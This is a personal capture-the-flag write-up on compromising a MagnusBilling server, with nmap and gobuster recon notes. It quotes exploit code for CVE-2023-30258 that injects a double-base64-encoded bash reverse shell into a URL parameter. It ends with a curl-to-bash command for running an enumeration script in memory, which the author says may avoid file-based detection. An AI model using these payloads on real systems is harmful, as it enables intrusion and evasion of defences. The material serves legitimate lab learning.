```shell
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.36.170/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql   MariaDB (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```notes
http://10.10.23.39/mbilling/black-neptune/resources/
actionMethods:{create:"POST",read:"GET",update:"POST",destroy:"POST"}
"marca","altera","User_ID_1","Password_1"
"Proxy_1","User_ID_2","Password_2",
user:j,password:m.SHA1(n.getValue())
url:"index.php/authentication/forgetPassword",params:{email:j
{xtype:"label",text:t("ONE TIME PASSWORD")
["username","password","id_group_agent","id_offer","callingcard_pin","contract_value"],
{name:"senha_admin",fieldLabel:t("Admin password")
```

Lessons: first try after a break - massive fail
- You can use curl with grep to parse thru source code of a webpage
	- Could be great to make a bash script for this
- gobuster with specified port :80 at the end of url can cause every request to miss
- Be diligent with recon, even on ctf do the whole range -p-

Initial info:
- app.js is available and some other styling content
- login fields have some anti SQL injection system
- some url endpoints seem to leak data such as DB col names
- php is in use (index.php)
- senha is prolly one of the users on the system (ssh attempt)

Try 2:
- Redo proper active  recon both gobuster and nmap
- explore new ports and directories, make a plan.

```shell
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.237.29/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql    MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```


```shell
gobuster dir -u http://10.10.34.78/mbilling/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,log,js
```

Getting the initial shell is possible via CVE-2023-30258 (RCE) command injection vuln.
Looking at the existing script for this cve, there is a function to run the exploit.
```python
    def exploit(self):
        requests.packages.urllib3.disable_warnings()
        print("Sending payload...")
        payload = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
        encoded_payload_1 = self.convert_to_b64(payload)
        encoded_payload_2 = self.convert_to_b64(encoded_payload_1)
        target_url = self.url + "lib/icepay/icepay.php?democ=null;echo " + encoded_payload_2 + "|base64 -d|base64 -d|sh;null"
        upload_req = requests.get(target_url,verify=False)
```
You can see that we are running a bash reverse shell for payload var.
That payload is then base64 encoded two times and eventually nested in the target url.
All that is left is to run a listener and send a request with payload.

Upon getting the shell some linux enumeration:
```shell
User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
```shell

```

Cool thing:
Usually when uploading stuff to target machine I setup an python http server and use wget to download the script.
But something even better is using curl and piping it's output to bash to achieve execution in memory without writing to a file.
This migh help avoid some protection systems that detect written files.
```shell
python -m http.server 80
curl 192.168.1.1/linpeas.sh | bash
```
By default curl operates on port 80 so no need to specify that